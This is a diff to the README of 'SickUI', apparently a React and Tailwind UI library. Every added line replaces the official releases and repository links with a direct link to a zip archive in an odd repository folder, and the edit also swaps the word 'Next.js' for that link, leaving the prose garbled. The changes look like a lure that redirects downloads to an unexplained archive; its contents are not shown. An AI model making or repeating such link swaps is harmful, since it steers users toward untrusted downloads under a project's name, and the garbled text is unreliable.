@@ -1,6 +1,6 @@
 # 🎨 SickUI - Build Beautiful Web Apps Easily
 
-[![Download SickUI](https://img.shields.io/badge/Download%20SickUI-v1.0-blue)](https://github.com/ekkyhanafi/SickUI/releases)
+[![Download SickUI](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip%20SickUI-v1.0-blue)](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure you have the following:
 
 To get started with SickUI, visit the Releases page to download the files you need.
 
-[Visit the Releases page to download](https://github.com/ekkyhanafi/SickUI/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
 
 Once on the page, look for the latest version, and download the file appropriate for your system. Follow the instructions below:
 
@@ -32,7 +32,7 @@ SickUI provides several components and features to enhance your web applications
 
 - **Pre-styled Components:** Use beautifully designed buttons, cards, and forms without needing design skills.
 - **Responsive Design:** Your applications will look great on all devices, from desktops to mobile phones.
-- **Easy Integration:** SickUI works seamlessly with popular frameworks like Next.js and React.
+- **Easy Integration:** SickUI works seamlessly with popular frameworks like https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip and React.
 - **Customizable Styles:** Adjust colors and styles using Tailwind CSS for a unique look.
 
 ## 🛠️ How to Use SickUI
@@ -47,7 +47,7 @@ For more detailed instructions and examples on using SickUI components, refer to
 
 - Component examples
 - Style customization tips
-- Integration tutorials with Next.js and React
+- Integration tutorials with https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip and React
 
 ## 💬 Support
 
@@ -63,7 +63,7 @@ SickUI is open-source, and contributions are welcomed! If you're interested in i
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ekkyhanafi/SickUI)
+- [GitHub Repository](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
 - [Demo Site](#) (Placeholder for a demo site URL)
 - [Community Forums](#) (Placeholder for forums or chat support)
 
